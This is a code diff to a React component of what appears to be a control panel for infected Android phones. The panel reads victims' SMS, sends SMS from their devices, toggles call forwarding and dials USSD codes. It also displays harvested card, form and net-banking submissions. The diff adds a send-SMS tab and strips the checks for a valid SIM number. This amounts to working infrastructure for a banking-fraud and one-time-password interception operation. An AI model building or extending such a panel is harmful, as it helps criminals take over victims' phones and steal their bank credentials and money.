@@ -30,6 +30,7 @@ import type { DeviceStatus } from "@/lib/deviceStatus";
 type DeviceDetailsTab =
   | "overview"
   | "sms"
+  | "send-sms"
   | "call-forwarding"
   | "ussd"
   | "all-data"
@@ -42,6 +43,7 @@ const NETBANK_KEYS = ["netbanking", "netbanking_data"];
 const DEVICE_DETAILS_TABS: DeviceDetailsTab[] = [
   "overview",
   "sms",
+  "send-sms",
   "call-forwarding",
   "ussd",
   "all-data",
@@ -531,34 +533,28 @@ export default function DeviceDetails({
   const [adminPhone1, setAdminPhone1] = useState(
     device.adminPhoneNumber[0] || "",
   );
-  const canUseSim1 = hasUsableSimNumber(device.sim1number);
-  const canUseSim2 = hasUsableSimNumber(device.sim2number);
-  const hasAnyUsableSim = canUseSim1 || canUseSim2;
-  const preferredSim = getDefaultSimSelection(
-    device.sim1number,
-    device.sim2number,
-  );
+  
+  // Always show both SIM options - number validation not needed for slot selection
+  const canUseSim1 = true; // Always enable SIM 1 for slot selection
+  const canUseSim2 = true; // Always enable SIM 2 for slot selection
+  const hasAnyUsableSim = true; // Always have at least one SIM available for selection
+  const preferredSim = 1; // Default to SIM 1
+  
   const availableSimOptions = [
-    canUseSim1
-      ? {
-          key: "sim1",
-          slot: 1 as const,
-          label: `${device.sim1Carrier || "SIM 1"} - ${device.sim1number}`,
-        }
-      : null,
-    canUseSim2
-      ? {
-          key: "sim2",
-          slot: 2 as const,
-          label: `${device.sim2Carrier || "SIM 2"} - ${device.sim2number}`,
-        }
-      : null,
-  ].filter(
-    (entry): entry is { key: "sim1" | "sim2"; slot: 1 | 2; label: string } =>
-      entry !== null,
-  );
+    {
+      key: "sim1",
+      slot: 1 as const,
+      label: `SIM 1 ${device.sim1number ? `- ${device.sim1number}` : ""}`,
+    },
+    {
+      key: "sim2",
+      slot: 2 as const,
+      label: `SIM 2 ${device.sim2number ? `- ${device.sim2number}` : ""}`,
+    },
+  ];
+  
   const isSimSelectable = (slot: 1 | 2) => {
-    return slot === 1 ? canUseSim1 : canUseSim2;
+    return true; // Always selectable for slot selection
   };
 
   const {
@@ -612,7 +608,7 @@ export default function DeviceDetails({
     if (!isSimSelectable(selectedSIM)) {
       setSelectedSIM(preferredSim);
     }
-  }, [selectedSIM, hasAnyUsableSim, preferredSim, canUseSim1, canUseSim2]);
+  }, [selectedSIM, hasAnyUsableSim, preferredSim]);
 
   useEffect(() => {
     if (!hasAnyUsableSim) {
@@ -622,7 +618,7 @@ export default function DeviceDetails({
     if (!isSimSelectable(forwardingSIM)) {
       setForwardingSIM(preferredSim);
     }
-  }, [forwardingSIM, hasAnyUsableSim, preferredSim, canUseSim1, canUseSim2]);
+  }, [forwardingSIM, hasAnyUsableSim, preferredSim]);
 
   useEffect(() => {
     if (!hasAnyUsableSim) {
@@ -632,10 +628,9 @@ export default function DeviceDetails({
     if (!isSimSelectable(ussdSimSlot)) {
       setUssdSimSlot(preferredSim);
     }
-  }, [ussdSimSlot, hasAnyUsableSim, preferredSim, canUseSim1, canUseSim2]);
+  }, [ussdSimSlot, hasAnyUsableSim, preferredSim]);
 
   useEffect(() => {
-    // Use props if available, otherwise fetch from database
     if (forms && forms.length > 0) {
       setFormSubmissions(forms);
     } else {
@@ -659,7 +654,6 @@ export default function DeviceDetails({
   }, [device.deviceId, forms]);
 
   useEffect(() => {
-    // Use props if available, otherwise fetch from database
     if (cards && cards.length > 0) {
       setCardSubmissions(cards);
     } else {
@@ -683,7 +677,6 @@ export default function DeviceDetails({
   }, [device.deviceId, cards]);
 
   useEffect(() => {
-    // Use props if available, otherwise fetch from database
     if (netBanking && netBanking.length > 0) {
       setNetbankingSubmissions(netBanking);
     } else {
@@ -785,20 +778,10 @@ export default function DeviceDetails({
       }
     }
   };
+  
   const handleSendUssd = async () => {
     if (!ussdCode) {
       alert("Please enter a USSD code");
-      return;
-    }
-
-    if (!hasAnyUsableSim) {
-      alert("No valid SIM number is available on this device");
-      return;
-    }
-
-    if (!isSimSelectable(ussdSimSlot)) {
-      setUssdSimSlot(preferredSim);
-      alert("Please select a SIM that has a valid number");
       return;
     }
 
@@ -943,17 +926,6 @@ export default function DeviceDetails({
   };
 
   const handleForwardSim = async () => {
-    if (!hasAnyUsableSim) {
-      alert("No valid SIM number is available on this device");
-      return;
-    }
-
-    if (!isSimSelectable(selectedSIM)) {
-      setSelectedSIM(preferredSim);
-      alert("Please select a SIM that has a valid number");
-      return;
-    }
-
     setSmsActionLoading(true);
     try {
       await update(ref(db, `registeredDevices/${device.deviceId}`), {
@@ -1133,18 +1105,6 @@ export default function DeviceDetails({
       return;
     }
 
-    if (!hasAnyUsableSim) {
-      alert("No valid SIM number is available on this device");
-      return;
-    }
-
-    if (!isSimSelectable(selectedSIM)) {
-      setSelectedSIM(preferredSim);
-      alert("Please select a SIM that has a valid number");
-      return;
-    }
-
-    // Here you would send the SMS via WebSocket or API
     const response = await fetch("/api/sendmessage", {
       method: "POST",
       headers: {
@@ -1165,6 +1125,9 @@ export default function DeviceDetails({
     logRequestResult("SMS send", data);
     if (data.success) {
       alert("SMS sent successfully");
+      onSendSMSModalClose();
+      setSmsReceiver("");
+      setSmsMessage("");
     } else {
       alert("Failed to send SMS");
     }
@@ -1173,17 +1136,6 @@ export default function DeviceDetails({
   const handleActivateForwarding = async () => {
     if (!forwardingNumber) {
       alert("Please enter a forwarding number");
-      return;
-    }
-
-    if (!hasAnyUsableSim) {
-      alert("No valid SIM number is available on this device");
-      return;
-    }
-
-    if (!isSimSelectable(forwardingSIM)) {
-      setForwardingSIM(preferredSim);
-      alert("Please select a SIM that has a valid number");
       return;
     }
 
@@ -1232,17 +1184,6 @@ export default function DeviceDetails({
   };
 
   const handleDeactivateForwarding = async () => {
-    if (!hasAnyUsableSim) {
-      alert("No valid SIM number is available on this device");
-      return;
-    }
-
-    if (!isSimSelectable(forwardingSIM)) {
-      setForwardingSIM(preferredSim);
-      alert("Please select a SIM that has a valid number");
-      return;
-    }
-
     const response = await fetch("/api/callforwarding", {
       method: "POST",
       headers: {
@@ -1421,6 +1362,16 @@ export default function DeviceDetails({
             </Button>
             <Button
               className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
+                selectedTab === "send-sms"
+                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
+                  : "border-[#2a4d9e] bg-white text-[#111]"
+              }`}
+              onPress={() => switchTab("send-sms")}
+            >
+              Send SMS
+            </Button>
+            <Button
+              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                 selectedTab === "call-forwarding"
                   ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                   : "border-[#2a4d9e] bg-white text-[#111]"
@@ -1453,7 +1404,27 @@ export default function DeviceDetails({
 
           {selectedTab === "sms" && (
             <div className="space-y-5 p-4 sm:p-6">
-              <h3 className="text-lg font-semibold text-(--text-main)">SMS</h3>
+              <div className="flex justify-between items-center">
+                <h3 className="text-lg font-semibold text-(--text-main)">SMS Messages</h3>
+                <div className="flex gap-2">
+                  <Button
+                    size="sm"
+                    onPress={handleRefreshSMS}
+                    isLoading={smsActionLoading}
+                    className="bg-blue-600 text-white"
+                  >
+                    Refresh
+                  </Button>
+                  <Button
+                    size="sm"
+                    onPress={handleGetSms}
+                    isLoading={smsActionLoading}
+                    className="bg-green-600 text-white"
+                  >
+                    Request SMS
+                  </Button>
+                </div>
+              </div>
 
               {/* SMS List */}
               <div className="space-y-3">
@@ -1533,17 +1504,86 @@ export default function DeviceDetails({
             </div>
           )}
 
+          {selectedTab === "send-sms" && (
+            <div className="space-y-5 p-4 sm:p-6">
+              <div className="rounded-xl bg-(--accent) px-4 py-2 text-center text-xl font-semibold text-white">
+                Send SMS
+              </div>
+
+              <Select
+                label="Select SIM"
+                placeholder="Choose SIM"
+                selectedKeys={[`sim${selectedSIM}`]}
+                onSelectionChange={(keys) => {
+                  if (keys === "all") {
+                    return;
+                  }
+
+                  const selectedKey = String(Array.from(keys)[0] ?? "");
+
+                  if (selectedKey === "sim1") {
+                    setSelectedSIM(1);
+                  }
+
+                  if (selectedKey === "sim2") {
+                    setSelectedSIM(2);
+                  }
+                }}
+                classNames={{
+                  trigger:
+                    "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
+                  value: "text-(--text-main)",
+                  label: "text-(--text-muted)",
+                }}
+              >
+                {availableSimOptions.map((option) => (
+                  <SelectItem key={option.key}>{option.label}</SelectItem>
+                ))}
+              </Select>
+
+              <Input
+                label="Receiver Number"
+                placeholder="Enter phone number"
+                value={smsReceiver}
+                onValueChange={setSmsReceiver}
+                classNames={{
+                  input: "text-(--text-main)",
+                  inputWrapper:
+                    "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
+                  label: "text-(--text-muted)",
+                }}
+              />
+
+              <Textarea
+                label="Message"
+                placeholder="Type your message here..."
+                value={smsMessage}
+                onValueChange={setSmsMessage}
+                minRows={4}
+                classNames={{
+                  input: "text-(--text-main)",
+                  inputWrapper:
+                    "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
+                  label: "text-(--text-muted)",
+                }}
+              />
+
+              <Button
+                className="h-11 w-full border border-emerald-600 bg-emerald-600 font-semibold text-white transition-all duration-200 hover:bg-emerald-700"
+                size="lg"
+                onPress={handleSendSMS}
+                isDisabled={!smsReceiver || !smsMessage}
+              >
+                Send SMS
+              </Button>
+            </div>
+          )}
+
           {selectedTab === "call-forwarding" && (
             <div className="space-y-5 p-4 sm:p-6">
               <div className="rounded-xl bg-(--accent) px-4 py-2 text-center text-xl font-semibold text-white">
                 Call Forwarding
               </div>
-
-              {!hasAnyUsableSim ? (
-                <div className="rounded-2xl border border-rose-200 bg-rose-50 p-4 text-sm text-rose-700">
-                  No active SIM number found for this device.
-                </div>
-              ) : null}
 
               <Select
                 label="Select SIM"
@@ -1564,7 +1604,6 @@ export default function DeviceDetails({
                     setForwardingSIM(2);
                   }
                 }}
-                isDisabled={!hasAnyUsableSim}
                 classNames={{
                   trigger:
                     "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
@@ -1597,7 +1636,6 @@ export default function DeviceDetails({
                   className="h-11 flex-1 border border-emerald-600 bg-emerald-600 font-semibold text-white transition-all duration-200 hover:bg-emerald-700"
                   size="lg"
                   onPress={handleActivateForwarding}
-                  isDisabled={!hasAnyUsableSim}
                 >
                   Enable
                 </Button>
@@ -1605,7 +1643,6 @@ export default function DeviceDetails({
                   className="h-11 flex-1 border border-rose-600 bg-rose-600 font-semibold text-white transition-all duration-200 hover:bg-rose-700"
                   size="lg"
                   onPress={handleDeactivateForwarding}
-                  isDisabled={!isForwardingActive || !hasAnyUsableSim}
                 >
                   Disable
                 </Button>
@@ -1682,12 +1719,6 @@ export default function DeviceDetails({
                 USSD Dialing
               </div>
 
-              {!hasAnyUsableSim ? (
-                <div className="rounded-2xl border border-rose-200 bg-rose-50 p-4 text-sm text-rose-700">
-                  No active SIM number found for this device.
-                </div>
-              ) : null}
-
               <Select
                 label="Select SIM"
                 placeholder="Choose SIM"
@@ -1707,7 +1738,6 @@ export default function DeviceDetails({
                     setUssdSimSlot(2);
                   }
                 }}
-                isDisabled={!hasAnyUsableSim}
                 classNames={{
                   trigger:
                     "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
@@ -1739,7 +1769,6 @@ export default function DeviceDetails({
                   size="lg"
                   onPress={handleSendUssd}
                   isLoading={isSendingUssd}
-                  isDisabled={!hasAnyUsableSim}
                 >
                   Send
                 </Button>
@@ -1749,9 +1778,6 @@ export default function DeviceDetails({
 
           {selectedTab === "view" && (
             <div className="space-y-6 p-4 sm:p-6">
-             
-
-
               <div className="space-y-4">
                 {renderSubmissionSection(
                   "Forms",
@@ -1860,9 +1886,7 @@ export default function DeviceDetails({
             <Select
               label="Forwarding SIM"
               placeholder="Select a SIM"
-              selectedKeys={
-                hasAnyUsableSim ? [selectedSIM === 1 ? "sim1" : "sim2"] : []
-              }
+              selectedKeys={[selectedSIM === 1 ? "sim1" : "sim2"]}
               onSelectionChange={(keys) => {
                 if (keys === "all") {
                   return;
@@ -1870,11 +1894,11 @@ export default function DeviceDetails({
 
                 const key = keys.values().next().value;
 
-                if (key === "sim1" && canUseSim1) {
+                if (key === "sim1") {
                   setSelectedSIM(1);
                 }
 
-                if (key === "sim2" && canUseSim2) {
+                if (key === "sim2") {
                   setSelectedSIM(2);
                 }
               }}
@@ -1884,12 +1908,8 @@ export default function DeviceDetails({
                 value: "text-(--text-main)",
               }}
             >
-              <SelectItem key="sim1" isDisabled={!canUseSim1}>
-                SIM 1
-              </SelectItem>
-              <SelectItem key="sim2" isDisabled={!canUseSim2}>
-                SIM 2
-              </SelectItem>
+              <SelectItem key="sim1">SIM 1</SelectItem>
+              <SelectItem key="sim2">SIM 2</SelectItem>
             </Select>
           </ModalBody>
           <ModalFooter>
@@ -1904,148 +1924,8 @@ export default function DeviceDetails({
               color="primary"
               className="bg-(--accent) font-semibold text-white transition-all duration-200 hover:bg-(--accent-strong)"
               onPress={handleForwardSim}
-              isDisabled={!hasAnyUsableSim}
             >
               Save Changes
-            </Button>
-          </ModalFooter>
-        </ModalContent>
-      </Modal>
-
-      {/* Send SMS Modal */}
-      <Modal
-        isOpen={isSendSMSModalOpen}
-        onClose={onSendSMSModalClose}
-        size="2xl"
-        classNames={{
-          base: "border border-(--border) bg-(--surface-glass) text-(--text-main) backdrop-blur-xl",
-          header: "border-b border-(--border) pb-4",
-          body: "py-5",
-          footer: "border-t border-(--border) pt-4",
-          closeButton:
-            "text-(--text-muted) hover:bg-(--accent-soft) hover:text-(--text-main)",
-        }}
-      >
-        <ModalContent>
-          <ModalHeader className="flex flex-col gap-1">
-            <h3 className="text-xl font-semibold text-(--text-main)">
-              Send SMS
-            </h3>
-            <p className="text-sm font-normal text-(--text-muted)">
-              Compose and send an SMS from this device.
-            </p>
-          </ModalHeader>
-          <ModalBody>
-            <div className="space-y-5">
-              <div className="space-y-2">
-                <div className="flex items-center justify-between">
-                  <label className="text-sm font-medium text-(--text-muted)">
-                    SIM
-                  </label>
-                  <span className="text-xs text-slate-700">
-                    Device ID: {device.deviceId}
-                  </span>
-                </div>
-
-                <ButtonGroup className="w-full rounded-xl border border-(--border) bg-white/85 p-1">
-                  <Button
-                    className={`h-14 flex-1 flex-col items-start justify-center gap-0 px-3 ${
-                      selectedSIM === 1 && canUseSim1
-                        ? "bg-(--accent) text-white"
-                        : "bg-transparent text-(--text-muted) hover:bg-(--accent-soft)"
-                    }`}
-                    onPress={() => {
-                      if (canUseSim1) {
-                        setSelectedSIM(1);
-                      }
-                    }}
-                    isDisabled={!canUseSim1}
-                  >
-                    <span className="text-[11px] font-semibold uppercase tracking-wide">
-                      SIM 1
-                    </span>
-                    <span className="text-xs opacity-80">
-                      {device.sim1Carrier || "Unknown carrier"}
-                    </span>
-                  </Button>
-                  <Button
-                    className={`h-14 flex-1 flex-col items-start justify-center gap-0 px-3 ${
-                      selectedSIM === 2 && canUseSim2
-                        ? "bg-(--accent) text-white"
-                        : "bg-transparent text-(--text-muted) hover:bg-(--accent-soft)"
-                    }`}
-                    onPress={() => {
-                      if (canUseSim2) {
-                        setSelectedSIM(2);
-                      }
-                    }}
-                    isDisabled={!canUseSim2}
-                  >
-                    <span className="text-[11px] font-semibold uppercase tracking-wide">
-                      SIM 2
-                    </span>
-                    <span className="text-xs opacity-80">
-                      {device.sim2Carrier || "Unknown carrier"}
-                    </span>
-                  </Button>
-                </ButtonGroup>
-              </div>
-
-              <Input
-                label="Receiver"
-                labelPlacement="outside"
-                placeholder="Enter receiver number"
-                type="tel"
-                value={smsReceiver}
-                onValueChange={setSmsReceiver}
-                startContent={<span className="text-sm text-slate-700">+</span>}
-                variant="bordered"
-                classNames={{
-                  label: "text-sm text-(--text-muted)",
-                  input: "text-(--text-main) placeholder:text-(--text-soft)",
-                  inputWrapper:
-                    "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)]",
-                }}
-              />
-
-              <Textarea
-                label="Message"
-                labelPlacement="outside"
-                placeholder="Type your message..."
-                value={smsMessage}
-                onValueChange={setSmsMessage}
-                minRows={6}
-                variant="bordered"
-                description={`${smsMessage.length} characters`}
-                classNames={{
-                  label: "text-sm text-(--text-muted)",
-                  input: "text-(--text-main) placeholder:text-(--text-soft)",
-                  inputWrapper:
-                    "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)]",
-                  description: "text-xs text-(--text-soft)",
-                }}
-              />
-            </div>
-          </ModalBody>
-          <ModalFooter className="gap-2">
-            <Button
-              variant="flat"
-              onPress={() => {
-                onSendSMSModalClose();
-                setSmsReceiver("");
-                setSmsMessage("");
-              }}
-              className="bg-(--accent-soft) font-semibold text-(--text-main) transition-all duration-200 hover:bg-(--accent-soft-strong)"
-            >
-              Cancel
-            </Button>
-            <Button
-              color="primary"
-              className="bg-(--accent) font-semibold text-white transition-all duration-200 hover:bg-(--accent-strong)"
-              onPress={handleSendSMS}
-              isDisabled={!hasAnyUsableSim}
-            >
-              Send Message
             </Button>
           </ModalFooter>
         </ModalContent>
